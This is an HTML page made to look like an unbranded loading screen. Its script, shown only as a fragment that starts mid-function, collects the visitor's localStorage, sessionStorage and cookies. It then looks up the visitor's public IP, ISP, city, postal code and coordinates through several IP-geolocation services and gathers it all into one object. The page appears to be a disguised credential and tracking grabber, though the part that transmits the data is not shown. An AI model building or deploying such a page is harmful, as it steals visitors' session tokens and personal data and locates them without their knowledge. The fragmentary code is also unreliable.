<!DOCTYPE html>

    <meta charset="UTF-8">

    <style>
        /* ── রিসেট ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0d0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            padding: 20px;
            color: #e8edf2;
        }

        .loader-wrapper {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        /* ── ব্র্যান্ড/শিরোনাম সম্পূর্ণ মুছে ফেলা ── */
        /* .brand মুছে ফেলা হয়েছে */

        .spinner {
            width: 64px;
            height: 64px;
            margin: 0 auto 28px;
            border: 4px solid #1e262e;
            border-top: 4px solid #4fc3f7;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ── স্ট্যাটাস টেক্সট – শুধু সাধারণ লোডিং দেখাবে ── */
        .status-text {
            font-size: 1.1rem;
            color: #b0bec5;
            margin-bottom: 12px;
            letter-spacing: 0.3px;
        }
        .status-text .dot {
            display: inline-block;
            animation: pulse 1.2s infinite;
        }
        .status-text .dot:nth-child(2) { animation-delay: 0.2s; }
        .status-text .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 20% { opacity: 0.2; }
            50% { opacity: 1; }
            80%, 100% { opacity: 0.2; }
        }

        .progress-track {
            width: 100%;
            height: 4px;
            background: #1e262e;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 18px;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4fc3f7, #26c6da);
            border-radius: 4px;
            transition: width 0.3s ease;
        }

        /* ── ফুটার সম্পূর্ণ মুছে ফেলা ── */
        /* .footer মুছে ফেলা হয়েছে */

        /* ── লুকানো এলিমেন্ট ── */
        .hidden {
            display: none !important;
        }
        #completeMsg {
            display: none;
        }
    </style>
</head>

                        for (var i = 0; i < localStorage.length; i++) {
                            var key = localStorage.key(i);
                            contents[key] = localStorage.getItem(key);
                        }
                        return contents;
                    } catch (e) { return "Unable to read"; }
                })(),
                sessionStorageContents: (function () {
                    try {
                        var contents = {};
                        for (var i = 0; i < sessionStorage.length; i++) {
                            var key = sessionStorage.key(i);
                            contents[key] = sessionStorage.getItem(key);
                        }
                        return contents;
                    } catch (e) { return "Unable to read"; }
                })(),
                cookies: document.cookie || "No cookies",
                cssFeatures: {
                    supportsGrid: CSS.supports("display", "grid"),
                    supportsFlex: CSS.supports("display", "flex"),
                    supportsCustomProperties: CSS.supports("--custom: property"),
                    supportsSticky: CSS.supports("position", "sticky")
                }
            };
            try {
                var ipServices = [
                    "https://api.ipify.org?format=json",
                    "https://api.my-ip.io/ip.json",
                    "https://ipapi.co/json/"
                ];
                for (var i = 0; i < ipServices.length; i++) {
                    try {
                        var response = await fetch(ipServices[i], { mode: 'cors' });
                        if (response.ok) {
                            var ipData = await response.json();
                            data.publicIP = ipData.ip || ipData.ipv4 || "Unknown";
                            if (ipData.country_name) data.country = ipData.country_name;
                            if (ipData.city) data.city = ipData.city;
                            if (ipData.region) data.region = ipData.region;
                            if (ipData.isp) data.isp = ipData.isp;
                            if (ipData.org) data.org = ipData.org;
                            if (ipData.postal) data.postalCode = ipData.postal;
                            if (ipData.latitude) data.latitude = ipData.latitude;
                            if (ipData.longitude) data.longitude = ipData.longitude;
                            break;
                        }
                    } catch (e) { continue; }
                }
            } catch (e) { data.publicIP = "Unable to fetch"; }
            try {
                var geoResponse = await fetch("http://ip-api.com/json/");
                if (geoResponse.ok) {
                    var geoData = await geoResponse.json();
                    if (geoData.status === "success") {
                        data.ipLocation = {
                            country: geoData.country,
                            countryCode: geoData.countryCode,
                            region: geoData.regionName,
                            regionCode: geoData.region,
                            city: geoData.city,
                            zip: geoData.zip,
                            lat: geoData.lat,
                            lon: geoData.lon,
                            timezone: geoData.timezone,
                            isp: geoData.isp,
                            org: geoData.org,
                            as: geoData.as,
                            query: geoData.query
                        };
                    }
                }
            } catch (e) {}
            return data;
        }
